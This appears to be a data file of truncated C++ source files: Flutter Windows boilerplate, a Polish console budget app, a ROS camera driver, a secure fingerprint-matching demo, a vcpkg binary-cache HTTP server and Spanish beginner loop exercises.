{\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Header.h\"\r\n\r\n\r\nstd::vector<std::vector<std::string>> wczytaj(const std::string& dane)\r\n{\r\n\tstd::vector<std::vector<std::string>> budzet_miesiac;\r\n\tstd::string linia;\r\n\r\n\tstd::ifstream plik(dane);\r\n\r\n\tif (!plik) {\r\n\t\tstd::cerr << \"Plik budget.txt nie istnieje\" << std::endl;\r\n\t\treturn budzet_miesiac;\r\n\t}\r\n\r\n\twhile (std::getline(plik, linia))\r\n\t{\r\n\t\tstd::vector<std::string> wiersz;\r\n\t\tstd::istringstream iss(linia);\r\n\t\tstd::string pole;\r\n\t\twhile (iss >> pole)\r\n\t\t{\r\n\t\t\twiersz.push_back(pole);\r\n\r\n\t\t}\r\n\t\tbudzet_miesiac.push_back(wiersz);\r\n\t}\r\n\treturn budzet_miesiac;\r\n}\r\n\r\nstd::vector<BudgetMiesiac> zaladuj_klasy(std::vector<std::vector<std::string>> budzet_miesiac, std::vector<BudgetMiesiac> Budget)\r\n{\r\n\tfor (int i = 0; i < budzet_miesiac.size(); i++) {\r\n\t\tBudgetMiesiac budget(std::stoi(budzet_miesiac[i][0]), budzet_miesiac[i][1], std::stoi(budzet_miesiac[i][2]));\r\n\t\tBudget.push_back(budget);\r\n\t}\r\n\treturn Budget;\r\n}\r\n\r\nvoid BudgetMiesiac::zapisBudget(std::vector<BudgetMiesiac> &Budget) {\r\n\r\n\tstd::ofstream plik(\"../budget.txt\");\r\n\tif (plik.is_open()) {\r\n\r\n\t\t//iterator z zajec\r\n\t\tfor (const auto& x : Budget) {\r\n\t\t\tplik << x.id << \" \" << x.name << \" \" << x.prize << std::endl;\r\n\t\t}\r\n\t\r\n\t\tplik.close();\r\n\r\n\t}\r\n\t \r\n\tzaladuj_klasy(wczytaj(\"../budget.txt\"), Budget);\r\n\r\n}\r\n\r\nBudgetMiesiac::BudgetMiesiac(int lp, std::string imie, double wartosc)\r\n{\r\n\tid = lp;\r\n\tname = imie;\r\n\tprize = wartosc;\r\n}\r\n\r\nvoid BudgetMiesiac::stworzBudget(std::vector<BudgetMiesiac> Budget)\r\n{\r\n\tbool check=0;\r\n\tdouble przychod; \r\n\tstd::cout << std::endl;\r\n\tstd::cout << \"$ TWORZENIE BUDZETU NA BIEZACY MIESIAC $\" << std::endl;\r\n\t\r\n\tdo\r\n\t{\r\n\t\tstd::cout << \"Podaj swoj przychod: \" << std::endl;\r\n\t\t//std::cin >> przychod;\r\n\t\t\t\r\n\t\t\tif (!(std::cin >> przychod)) {\r\n\t\t\t\tstd::cout << \"Nieprawidlowa postac pensji. \";\r\n\t\t\t\tstd::cin.clear(); // Resetowanie stanu strumienia\r\n\t\t\t\tstd::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); //Ignorowanie danych - bufor\r\n\t\t\t\tcheck = 0;\r\n\t\t\t} \r\n\t\t\telse if (przychod < 0)\r\n\t\t\t{\r\n\t\t\t\tcheck = 0;\r\n\t\t\t\tstd::cout << \"Przychod nie moze byc ujemny! \";\r\n\t\t\t}\r\n\t\t\telse if (przychod >= 0)\r\n\t\t\t{\r\n\t\t\t\tcheck =1;\r\n\t\t\t}\r\n\t\t\t\r\n\t} while (!check);\r\n\r\n\tBudget[0].prize = przychod;\r\n\r\n\tfor(int i=1;i<Budget.size(); i++)\r\n\t{\r\n\t\tbool check;\r\n\t\tdouble wydatek;\r\n\t\t\r\n\t\tdo {\r\n\t\tstd::cout << \"Podaj wartosc wydatkow - \" + Budget[i].name + \": \" << std::endl;\r\n\t\tstd::cin >> wydatek;\r\n\r\n\t\t\tif (std::cin.fail()) \r\n\t\t\t{\r\n\t\t\t\tstd::cout << \"Nieprawidlowa postac kwoty wydatku. \"<<std::endl;\r\n\t\t\t\tstd::cin.clear(); // Resetowanie stanu strumienia\r\n\t\t\t\tstd::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); //Ignorowanie danych - bufor\r\n\t\t\t\tcheck = 0;\r\n\t\t\t}\r\n\t\t\telse if(wydatek < 0)\r\n\t\t\t{\r\n\t\t\t\t\tstd::cout << \"Wydatek nie moze byc ujemny!\" << std::endl;\r\n\t\t\t\t\tcheck = 0;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tcheck = 1; \r\n\t\t\t}\r\n\t\t\r\n\t\t} while (!check);\r\n\r\n\t\tBudget[i].prize = wydatek;\r\n\r\n\t\t\r\n\t}\r\n\r\n\tBudget[0].zapisBudget(Budget);\r\n\tstd::cout << \"$ BUDZET ZOSTAL STWORZONY $\" << std::endl;\r\n\r\n\tgetchar(); getchar();\r\n}\r\n\r\nvoid BudgetMiesiac::wyswietlBudget(std::vector<BudgetMiesiac> Budget)\r\n{\t\r\n\tsystem(\"cls\");\r\n\tstd::cout << std::setw(23) << \"$ BUDZET $\" << std::endl;\r\n\tstd::cout << \"----------------<$>----------------\" << std::endl;\r\n\tstd::cout << \"Przychod: \" << Budget[0].prize << \" zl\" << std::endl;\r\n\tstd::cout << \"----------------<$>----------------\" << std::endl;\r\n\tstd::cout << std::setw(30) << \"$ MIESIECZNE WYDATKI $ \" << std::endl;\r\n\tint suma =0;\r\n\r\n\tfor (int i = 1; i < Budget.size(); i++)\r\n\t{\r\n\t\tstd::cout << std::setw(5) << std::right << Budget[i].id << std::left << \". \" << std::setw(16) << std::left << Budget[i].name << std::setw(10) << std::right << Budget[i].prize << \" zl\" << std::endl;\r\n\t\tsuma += Budget[i].prize;\r\n\t}\r\n\t\r\n\tstd::cout << \"SUMA MIESIECZNYCH WYDATKOW:     \" << suma << \" zl\" << std::endl;\r\n\tstd::cout << \"----------------<$>----------------\" << std::endl;\r\n\tstd::cout << std::endl;\r\n\r\n\tstd::cout << std::setw(30) << \"<$> PODSUMOWANIE <$>   \" << std::endl;\r\n\tstd::cout << \"----------------<$>----------------\" << std::endl;\r\n\r\n\tif(Budget[0].prize >= suma)\r\n\t{\r\n\t\tstd::cout << \"OSZCZEDZISZ PO TYM MIESIACU:     \" << Budget[0].prize - suma << \" zl\" << std::endl;\r\n\t}\r\n\telse if (Budget[0].prize < suma)\r\n\t{\r\n\t\tstd::cout << \"BRAKNIE CI W TYM MIESIACU:  \" << Budget[0].prize - suma << \" zl\" << std::endl;\r\n\t\tstd::cout << \"-----------------------------------\" << std::endl;\r\n\t\tstd::cout << \"OGRANICZ WYDATKI LUB ZWIEKSZ PRZYCHOD\" << std::endl;\r\n\t\tstd::cout << \"----------------<$>----------------\" << std::endl;\r\n\t}\r\n\r\n\tstd::vector<CelFinansowy> target;\r\n\tstd::string linia;\r\n\r\n\tstd::ifstream plik(\"../cel.txt\");\r\n\r\n\tif (!plik) {\r\n\t\tstd::cerr << \"Plik cel.txt nie istnieje\" << std::endl;\r\n\t}\r\n\r\n\tif (std::getline(plik, linia))\r\n\t{\r\n\t\tstd::istringstream iss(linia);\r\n\t\tCelFinansowy celFinansowy;\r\n\t\tiss >> celFinansowy.target_name >> celFinansowy.target_prize >> celFinansowy.target_months;\r\n\t\ttarget.push_back(celFinansowy);\r\n\t}\r\n\r\n\tstd::cout << std::endl;\r\n\tstd::cou",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Software License Agreement (BSD License)\n//\n// Copyright (c) 2021, National Institute of Advanced Industrial Science and Technology (AIST)\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions\n// are met:\n//\n//  * Redistributions of source code must retain the above copyright\n//    notice, this list of conditions and the following disclaimer.\n//  * Redistributions in binary form must reproduce the above\n//    copyright notice, this list of conditions and the following\n//    disclaimer in the documentation and/or other materials provided\n//    with the distribution.\n//  * Neither the name of National Institute of Advanced Industrial\n//    Science and Technology (AIST) nor the names of its contributors\n//    may be used to endorse or promote products derived from this software\n//    without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n// \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n// LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n// ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n// POSSIBILITY OF SUCH DAMAGE.\n//\n// Author: Toshio Ueshiba\n//\n/*!\n *  \\file\tCamera.cpp\n */\n#if PHO_SOFTWARE_VERSION_MAJOR >= 1\n#  if PHO_SOFTWARE_VERSION_MINOR >= 4\n#    define HAVE_MOTIONCAM\n#    if PHO_SOFTWARE_VERSION_MINOR >= 5\n#      define HAVE_INTERREFLECTIONS_FILTERING\n#      define HAVE_HARDWARE_TRIGGER\n#      define HAVE_MOTIONCAM_EXPOSURE\n#      if PHO_SOFTWARE_VERSION_MINOR >= 7\n#        define HAVE_HARDWARE_TRIGGER_SIGNAL\n#        define HAVE_INTERREFLECTION_FILTER_STRENGTH\n#\t if PHO_SOFTWARE_VERSION_MINOR >= 8\n#          define HAVE_LED_POWER\n#          define HAVE_LED_SHUTTER_MULTIPLIER\n#\t   if PHO_SOFTWARE_VERSION_MINOR >= 9\n#            define HAVE_COLOR_CAMERA\n#          endif\n#        endif\n#      endif\n#    endif\n#  endif\n#endif\n\n#include \"Camera.h\"\n#include <ros/package.h>\n#include <sensor_msgs/point_cloud2_iterator.h>\n#include <sensor_msgs/image_encodings.h>\n#include <tf2_geometry_msgs/tf2_geometry_msgs.h>\n#include <nodelet/nodelet.h>\n#include <x86intrin.h>\n\nnamespace aist_phoxi_camera\n{\n/************************************************************************\n*  static functions\t\t\t\t\t\t\t*\n************************************************************************/\ntemplate <class T> static std::ostream&\noperator <<(std::ostream& out, const pho::api::PhoXiFeature<T>& feature)\n{\n    return out << feature.GetValue();\n}\n\nstatic std::ostream&\noperator <<(std::ostream& out, const pho::api::Point3_64f& p)\n{\n    return out << '(' << p.x << ' ' << p.y << ' ' << p.z << ')';\n}\n\nstatic size_t\nnpoints_valid(const pho::api::PointCloud32f& cloud)\n{\n    size_t\tn = 0;\n    for (int v = 0; v < cloud.Size.Height; ++v)\n    {\n\tauto\tp = cloud[v];\n\n\tfor (const auto q = p +  cloud.Size.Width; p != q; ++p)\n\t    if (float(p->z) != 0.0f)\n\t\t++n;\n    }\n\n    return n;\n}\n\nstatic void\nscale_copy(const float* in, const float* ie, uint8_t* out, float scale)\n{\n#if defined(AVX2)\n    const auto\tk = _mm256_set1_ps(scale);\n\n    for (; in != ie; out += 32)\n    {\n\tauto i_lo = _mm256_cvtps_epi32(_mm256_mul_ps(_mm256_loadu_ps(in), k));\n\tin += 8;\n\tauto i_hi = _mm256_cvtps_epi32(_mm256_mul_ps(_mm256_loadu_ps(in), k));\n\tin += 8;\n\tconst auto s_lo = _mm256_packs_epi32(\n\t\t\t\t_mm256_permute2f128_si256(i_lo, i_hi, 0x20),\n\t\t\t\t_mm256_permute2f128_si256(i_lo, i_hi, 0x31));\n\n\ti_lo = _mm256_cvtps_epi32(_mm256_mul_ps(_mm256_loadu_ps(in), k));\n\tin += 8;\n\ti_hi = _mm256_cvtps_epi32(_mm256_mul_ps(_mm256_loadu_ps(in), k));\n\tin += 8;\n\tconst auto s_hi = _mm256_packs_epi32(\n\t\t\t\t_mm256_permute2f128_si256(i_lo, i_hi, 0x20),\n\t\t\t\t_mm256_permute2f128_si256(i_lo, i_hi, 0x31));\n\n\t_mm256_storeu_si256(reinterpret_cast<__m256i*>(out),\n\t\t\t    _mm256_packus_epi16(\n\t\t\t\t_mm256_permute2f128_si256(s_lo, s_hi, 0x20),\n\t\t\t\t_mm256_permute2f128_si256(s_lo, s_hi, 0x31)));\n    }\n#else\n    std::transform(in, ie, out,\n\t\t   [scale](const auto& x)->uint8_t\n\t\t   { return std::min(scale * x, 255.0f); });\n#endif\n}\n\nstatic void\nscale_copy(const float* in, const float* ie, float* out, float scale)\n{\n#if defined(AVX2)\n    const auto\tk = _mm256_set1_ps(scale);\n\n    for (; in != ie; in += 8, out += 8)\n\t_mm256_storeu_ps(out, _mm256_mul_ps(_mm256_loadu_ps(in), k));\n#else\n    std::transform(in, ie, out,\n\t\t   [scale](const auto& x)->float\n\t\t   { return scale * x; });\n#endif\n}\n\nstatic void\nscale_copy(const uint16",
    "#include \"fingercodes-vt.hpp\"\n\n#include <coproto/Socket/AsioSocket.h>\n#include <cryptoTools/Common/CLP.h>\n#include <libOTe/Base/BaseOT.h>\n#include <libOTe/TwoChooseOne/Iknp/IknpOtExtReceiver.h>\n#include <libOTe/TwoChooseOne/Iknp/IknpOtExtSender.h>\n\n#include \"triple.hpp\"\n\nusing namespace osuCrypto;\n\nconst string FingerCodesVT::defaultDB = \"fingercodes.txt\";\nuint32_t FingerCodesVT::bitlen = FingerCodesVT::BITLEN;\nusing UINT = uint64_t;\nusing INT = int64_t;\n\nvoid FingerCodesVT::gen(size_t num) {\n  ofstream out(defaultDB);\n  out << num << endl;\n  for (size_t i = 0; i < num; i++) {\n    auto data = randomUint8(dim);\n    auto s = base64_encode(data);\n    out << s << endl;\n  }\n}\n\nvector<uint8_t> FingerCodesVT::Sample(size_t x) {\n  vector<uint8_t> data(dim, 0);\n  if (x < 256) {\n    data = vector<uint8_t>(dim, x);\n  } else if (x == 256) {\n    for (size_t i = 0; i < dim; i++) {\n      data[i] = i % 256;\n    }\n  }\n  return data;\n}\n\nsize_t FingerCodesVT::euclidianDistance(vector<uint8_t> x, vector<uint8_t> y) {\n  size_t ed = 0;\n  for (size_t i = 0; i < dim; i++) {\n    ed += (x[i] - y[i]) * (x[i] - y[i]);\n  }\n  return ed;\n}\n\ninline u64 FingerCodesVT::square(vector<uint8_t> x, size_t mod) {\n  u64 sum = 0;\n  for (size_t i = 0; i < dim; i++) {\n    sum += x[i] * x[i];\n    sum = sum % mod;\n  }\n  return sum;\n}\n\nFingerCodesServerVT::FingerCodesServerVT(string db) {\n  log = ofstream(\"server-log.txt\");\n  if (db == \"\") {\n    db = defaultDB;\n  }\n  PRNG prng(sysRandomSeed());\n\n  vector<vector<uint8_t>> data;\n  ifstream in(db);\n  if (in.good()) {\n    string line;\n    in >> n;\n    for (size_t j = 0; j < n; j++) {\n      in >> line;\n      data.push_back(base64_decode(line));\n    }\n  } else {\n    for (size_t j = 0; j < n; j++) {\n      data.push_back(randomUint8(dim));\n    }\n  }\n\n  auto chl = cp::asioConnect(\"127.0.0.1:7700\", true);\n  cp::sync_wait(chl.send(n));\n  cp::sync_wait(chl.recv(nc));\n\n  vector<vector<u32>> x0(nc, vector<u32>(dim, 0));\n  vector<vector<u32>> y0(dim, vector<u32>(n));\n  for (size_t k = 0; k < dim; k++) {\n    for (size_t i = 0; i < n; i++) {\n      y0[k][i] = data[i][k];\n    }\n  }\n\n  auto triple = fakeZ<u32>(nc, n, dim);\n\n  vector<u32> R(n, 0);\n\n  auto otStart = chrono::high_resolution_clock::now();\n  auto mpShare = mp0<u32, u32>(chl, triple.first, x0, y0);\n  auto otEnd = chrono::high_resolution_clock::now();\n\n  u64 traffic = chl.bytesSent() + chl.bytesReceived();\n  cout << \"Matrix product time: \"\n       << chrono::duration_cast<chrono::microseconds>(otEnd - otStart).count()\n       << \"us with transferred \"  << traffic << \" \"\n       << (traffic >> 10) << \"KiB\" << endl;\n\n  for (u64 j = 0; j < n; j++) {\n    R[j] = square(data[j], mod) - 2 * mpShare[0][j];\n  }\n\n  vector<u32> uR(n);\n  for (u64 j = 0; j < n; j++) {\n    uR[j] = (R[j]);\n  }\n//  if (MODE == 0) {\n//    ABY aby(mod, threshold, bitlen, circType);\n//    auto res = aby.AddMatchingR(uR);\n//    cout << \"Final matching: \" << (res ? \"True\" : \"False\") << endl;\n//  } else if (MODE == 1) {\n//    ABY aby(mod, threshold, bitlen, circType);\n//    auto res = aby.EveryMatchingR(uR);\n//    for (size_t i = 0; i < n; i++) {\n//      cout << \"Result of finger \" << i << \": \"\n//          << (res[i] == 1 ? \"True\" : \"False\") << endl;\n//    }\n//  } else if (MODE == 2) {\n//    ABY aby(mod, threshold, bitlen, circType);\n//    auto res = aby.AddEveryDistanceR(uR);\n//    for (size_t i = 0; i < n; i++) {\n//      cout << \"ED of finger \" << i << \": \" << res[i] << endl;\n//    }\n//  }\n}\n\nFingerCodesClientVT::FingerCodesClientVT(string db) {\n  log = ofstream(\"client-log.txt\");\n  PRNG prng(sysRandomSeed());\n\n  if (db == \"\") {\n    db = defaultDB;\n  }\n\n  vector<vector<uint8_t>> data;\n  ifstream in(db);\n  if (in.good()) {\n    string line;\n    in >> nc;\n    for (size_t j = 0; j < nc; j++) {\n      in >> line;\n      data.push_back(base64_decode(line));\n    }\n  } else {\n    for (size_t j = 0; j < nc; j++) {\n      data.push_back(randomUint8(dim));\n    }\n  }\n\n  auto chl = cp::asioConnect(\"127.0.0.1:7700\", false);\n  IknpOtExtReceiver receiver;\n  cp::sync_wait(chl.recv(n));\n  cp::sync_wait(chl.send(nc));\n\n  vector<u32> T(n);\n\n  vector<vector<u32>> x0(nc, vector<u32>(dim));\n  for (size_t k = 0; k < dim; k++) {\n    for (size_t i = 0; i < nc; i++) {\n      x0[i][k] = data[i][k];\n    }\n  }\n  vector<vector<u32>> y0(dim, vector<u32>(n, 0));\n\n  auto triple = fakeZ<u32>(nc, n, dim);\n\n  auto mpShare = mp1<u32, u32>(chl, triple.second, x0, y0);\n\n  cp::sync_wait(chl.flush());\n\n  for (u64 j = 0; j < n; j++) {\n    T[j] = square(data[0], mod) - 2 * mpShare[0][j];\n  }\n\n  vector<u32> uT(n);\n  for (u64 j = 0; j < n; j++) {\n    uT[j] = (T[j]);\n  }\n//  if (MODE == 0) {\n//    ABY aby(mod, threshold, bitlen, circType);\n//    auto res = aby.AddMatchingT(uT);\n//    cout << \"Final matching: \" << (res ? \"True\" : \"False\") << endl;\n//  } else if (MODE == 1) {\n//    ABY aby(mod, threshold, bitlen, circType);\n//    auto res = aby.EveryMatchingT(uT);\n//    for (size_t i = 0; i < n; i++) {\n//      cout << \"Result of finger \" << i << \": \"\n//",
    "#include <httplib.h>\n#include <libzippp.h>\n\n#include <filesystem>\n#include <fstream>\n#include <unordered_map>\n#include <string>\n#include <string_view>\n#include <ranges>\n#include <format>\n#include <print>\n\nconstexpr std::pair<std::string_view, std::string_view> splitByFirst(std::string_view str,\n                                                                     char delimiter = ' ') {\n    const auto pos = str.find(delimiter);\n    return {str.substr(0, pos), pos != str.npos ? str.substr(pos + 1) : std::string_view{}};\n}\n\n// 00b98928f1cb8655797797428ad21a0aad56bec9d0613d6d0dfab20307b97faa\n\nconst std::filesystem::path base =\n    \"C:/Users/petst55.AD/OneDrive - Link\u00f6pings universitet/Cache/vcpkg-cache\";\n\nstd::filesystem::path shaToPath(std::string_view sha) {\n    return base / sha.substr(0, 2) / std::format(\"{}.zip\", sha);\n}\n\nbool exists(std::string_view sha) { return std::filesystem::is_regular_file(shaToPath(sha)); }\n\nstd::unordered_map<std::string, std::string> controlInfo(const std::filesystem::path& path) {\n    libzippp::ZipArchive zf{path.generic_string()};\n    zf.open(libzippp::ZipArchive::ReadOnly);\n    auto ctrl = zf.getEntry(\"CONTROL\");\n    if (ctrl.isNull()) {\n        return {};\n    }\n\n    return ctrl.readAsText() | std::views::split('\\n') | std::views::transform([](auto&& line) {\n               auto [key, value] = splitByFirst(std::string_view(line), ':');\n               return std::pair<const std::string, std::string>(key, value);\n           }) |\n           std::ranges::to<std::unordered_map>();\n}\n\nconst auto logger = [](const httplib::Request& req, const httplib::Response& res) {\n    std::println(\"================================\");\n    std::println(\"{} {} {}\", req.method, req.version, req.path);\n    for (auto it = req.params.begin(); it != req.params.end(); ++it) {\n        std::println(\"{}{}={}\", (it == req.params.begin()) ? '?' : '&', it->first, it->second);\n    }\n    for (const auto& [key, val] : req.headers) {\n        std::println(\"{}: {}\", key, val);\n    }\n    for (const auto& [name, file] : req.files) {\n        std::println(\"name: %s\\n\", name);\n        std::println(\"filename: %s\\n\", file.filename);\n        std::println(\"content type: %s\\n\", file.content_type);\n        std::println(\"text length: %zu\\n\", file.content.size());\n        std::println(\"----------------\");\n    }\n    std::println(\"--------------------------------\");\n    std::println(\"{}\", res.status);\n    for (const auto& [key, val] : res.headers) {\n        std::println(\"{}: {}\", key, val);\n    }\n};\n\nint main(void) {\n    // httplib::SSLServer server{};\n\n    httplib::Server server{};\n\n    // server.set_logger(logger);\n\n    server.Get(R\"(/cache/([0-9a-f]{64}))\", [&](const httplib::Request& req,\n                                               httplib::Response& res) {\n        auto sha = req.matches[1].str();\n        const auto file = shaToPath(sha);\n        const auto exists = std::filesystem::is_regular_file(file);\n\n        if (!exists) {\n            res.status = httplib::StatusCode::NotFound_404;\n            return;\n        }\n\n        auto info = controlInfo(file);\n        const auto time = std::filesystem::last_write_time(file);\n        const auto size = std::filesystem::file_size(file);\n        std::println(\"{:5} Package: {:20} Version: {:7} Arch: {:15} Time: {:20} Size: {:10} Sha:{}\",\n                     req.method, info[\"Package\"], info[\"Version\"], info[\"Architecture\"], time, size,\n                     req.path);\n\n        auto fstream =\n            std::make_shared<std::fstream>(file, std::ios_base::in | std::ios_base::binary);\n\n        std::println(\"Get {} {}\", sha, size);\n\n        res.set_content_provider(\n            size, \"application/zip\",\n            [size, fstream, buff = std::vector<char>(1024)](\n                size_t offset, size_t length, httplib::DataSink& sink) mutable -> bool {\n                std::println(\"Get callback {} {} {}\", size, offset, length);\n                buff.resize(length);\n                fstream->seekg(offset);\n                fstream->read(buff.data(), length);\n                sink.write(buff.data(), length);\n                return true;\n            });\n    });\n\n    server.set_error_handler([](const httplib::Request& req, httplib::Response& res) {\n        res.set_content(\n            std::format(\"<p>Error Status: <span style='color:red;'>{}</span></p>\", res.status),\n            \"text/html\");\n    });\n    server.set_exception_handler(\n        [](const httplib::Request& req, httplib::Response& res, std::exception_ptr ep) {\n            try {\n                std::rethrow_exception(ep);\n            } catch (std::exception& e) {\n                res.set_content(std::format(\"<h1>Error 500</h1><p>{}</p>\", e.what()), \"text/html\");\n            } catch (...) {  // See the following NOTE\n                res.set_content(\"<h1>Error 500</h1>Unknown error</p>\", \"text/html\");\n            }\n            res.status = httplib::StatusCode::InternalServerError_500;\n        });\n\n    /*\n    // Capture the second segment of ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"api_test_2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*EJERCIOCIO 1\nHacer un programa para mostrar por pantalla los n\u00fameros del 1 al 10.\nImportante: El programa no tiene ning\u00fan ingreso de datos.\n\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n    int n =1;\n\n    while (n<11){\n        cout << n++ << endl;\n    }\n    return 0;\n\n}*/\n/*EJERCICIO 2\nHacer un programa para mostrar por pantalla los n\u00fameros del 1 al 20 salteando\nde a 3 elementos. Es decir: 1, 4, 7, 10, 13, 16, 19. Importante: El programa no\ntiene ning\u00fan ingreso de datos.\n\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n    int n =1;\n\n    while (n<21){\n        cout << \"La variabvle es: \" << n << endl;\n        n=+3\n    }\n    return 0;\n\n}*/\n/* EJERCICIO 3\nHacer un programa para mostrar por pantalla los n\u00fameros del 20 al 1\nen orden decreciente.\nImportante: El programa no tiene ning\u00fan ingreso de datos.\n\n\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n    int n = 20;\n\n    while (n>0){\n        cout << n-- << endl;\n    }\n    return 0;\n\n}*/\n/*EJERCICIO 4\nHacer un programa para que el usuario ingrese un n\u00famero positivo y que luego se muestre por pantalla los n\u00fameros\nentre el 1 y el n\u00famero ingresado por el usuario. Ejemplo. Si el usuario ingresa 15, se mostrar\u00e1n los n\u00fameros entre el 1 y el 15.\n\n\n#include <iostream>\n\nusing namespace std;\n\nint main(){\n    int n, contador = 1;\n\n    cout << \"Ingrese un numero positivo: \";\n    cin >> n;\n\n    while (n>=contador){\n        cout << contador++ <<endl;\n    }\n    return 0;\n\n}*/\n/* EJERCICIO 5\nHacer un programa para que el 